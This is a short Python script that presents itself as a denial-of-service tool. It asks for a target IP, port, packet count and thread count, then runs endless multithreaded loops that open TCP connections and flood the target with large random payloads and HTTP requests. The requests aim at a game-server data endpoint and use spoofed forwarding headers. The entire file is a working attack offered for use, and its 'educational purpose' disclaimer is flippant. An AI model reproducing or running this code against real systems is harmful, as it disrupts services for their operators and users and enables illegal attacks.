# This is a simple ddos script
#This is only for educational Purpose, it can lead to ©yber©rime use it on your own risk, if you are found guilty I'll Just Laugh At You. 🙂

import random, socket, threading

useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1']


acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n']

referers = [
'http://help.baidu.com/searchResult?keywords=',
'http://www.bing.com/search?q']

print(''' Denial of Service Attack (Dos) ) 

note - using it for revenge purpose is illegal use it on your own risk



                                          -tool by Carnage Sentinels''')

shiash=input(" Enter Website -- " )
ip = str(input("Target IP : "))
port = int(input("Destination Port : "))
times = int(input("Packets : "))
threads = int(input("Threads : "))

def run():

    get_host = "GET /growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
    referer = "Referer: " + random.choice(referers) + ip + "\r\n"
    accept = random.choice(acceptall)
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
    length = "Content-Length: 0\r\n"
    forward = "X-Forwarded-For: " + ip + "\r\n"
    forwards = "Client-IP: " + ip + "\r\n"
    header = get_host + referer + forward + useragent + accept + content + connection + length + "\r\n\r\n"
    randomip = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
    request = get_host + forward + connection + useragent + forwards + header + length + randomip + referer + content + accept + "\r\n"
    data = random._urandom(600000)

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            s.send(str.encode(request))
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            for x in range(times):
                s.send(data)
                s.send(str.encode(request))
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"Request sent => {ip}")
        except :
            print(f"Request send => {ip}")
            s.close()

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()

